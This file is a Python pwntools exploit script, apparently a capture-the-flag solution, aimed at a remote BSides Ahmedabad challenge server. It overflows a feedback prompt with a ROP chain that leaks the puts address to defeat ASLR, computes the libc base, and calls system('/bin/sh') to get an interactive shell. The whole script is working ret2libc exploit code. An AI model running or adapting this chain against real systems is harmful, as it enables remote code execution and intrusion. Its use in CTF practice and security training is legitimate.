from pwn import *

libc = ELF("libc-2.31.so")
p = remote("pwn2.bsidesahmedabad.in", 9001)
# p = process("./vuln_patched", env={"LD_PRELOAD":"libc-2.31.so"})
elf = ELF("vuln")
# context.terminal = ["tmux", "splitw", "-h"]
# gdb.attach(p,gdbscript= """ 
            # b *0x40111B
                # continue
            # """)
pop_rdi = 0x401273
main = 0x4010B0
p.sendlineafter("your feedback: ", "A"*0x48 + p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(main))
p.recvline()
p.recvline()

puts_got = u64(p.recvline()[0:6] + "\x00\x00")
libc.address = puts_got - libc.symbols["puts"]
print hex(libc.address)
binsh = next(libc.search("/bin/sh\x00"))
success("/bin/sh: %s"%hex(binsh))
p.sendlineafter("your feedback: ", "A"*0x48 + p64(0x40101a) + p64(pop_rdi) + p64(next(libc.search("/bin/sh\x00"))) + p64(libc.symbols["system"]))

p.interactive()